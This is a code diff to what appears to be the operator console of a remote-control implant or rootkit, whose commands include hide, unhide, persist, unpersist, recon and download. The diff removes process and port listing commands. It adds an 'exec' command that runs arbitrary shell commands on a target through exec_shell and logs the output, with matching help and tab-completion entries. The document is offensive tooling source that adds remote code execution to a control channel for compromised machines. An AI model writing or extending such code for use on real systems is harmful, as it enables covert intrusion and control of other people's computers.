@@ -70,6 +70,8 @@ def _build_help(proto: dict) -> str:
             return t.lower()
         name = " ".join(_fmt_token(t) for t in wire.split())
         groups[g].append(f"  {name:<22}{cmd['help']}")
+    groups.setdefault("recon", [])
+    groups["recon"].append(f"  {'exec COMMAND':<22}run command on target via exec shell")
     groups.setdefault("session", [])
     groups["session"].append(f"  {'help':<22}show this reference")
     order = ["hide", "unhide", "operate", "recon", "view", "list", "session"]
@@ -95,6 +97,7 @@ def _build_completions(proto: dict) -> dict:
             comps[parts[0]][parts[1]] = None
     comps["help"] = None
     comps["quit"] = None
+    comps["exec"] = None
     return comps
 
 
@@ -275,13 +278,18 @@ class OperatorConsole:
     def do_unpersist(self, arg: str) -> None:
         self._send("UNPERSIST")
 
-    def do_ps(self, arg: str) -> None:
-        idx = arg.strip()
-        self._send(f"PS {idx}" if idx else "PS")
-
-    def do_ports(self, arg: str) -> None:
-        idx = arg.strip()
-        self._send(f"PORTS {idx}" if idx else "PORTS")
+    def do_exec(self, arg: str) -> None:
+        cmd = arg.strip()
+        if not cmd:
+            log.warning("usage: exec COMMAND")
+            return
+        if not self._target:
+            log.warning("exec requires server mode")
+            return
+        try:
+            log.info("%s", self._target.exec_shell(cmd))
+        except Exception as e:
+            log.warning("exec: %s", e)
 
     def do_download(self, arg: str) -> None:
         remote_path = arg.strip()
